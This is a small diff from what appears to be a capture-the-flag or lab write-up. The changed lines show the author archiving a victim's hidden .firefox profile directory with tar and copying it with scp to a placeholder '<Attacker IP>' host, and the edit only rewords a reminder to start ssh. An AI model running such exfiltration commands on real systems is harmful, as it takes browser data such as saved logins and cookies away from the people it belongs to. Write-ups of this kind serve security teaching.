@@ -164,7 +164,7 @@ For now, I'm going to check firefox hidden directory by sending that to my machi
     user@ubuntu:~$ tar -cvf firefox.tgz .firefox 
 
     ---
-    Don't forget to start ssh in your Attacker machine
+    Don't forget to start ssh in your machine
     ---
 
     user@ubuntu:~$ scp firefox.tgz <Attacker Machine username>@<Attacker IP>:
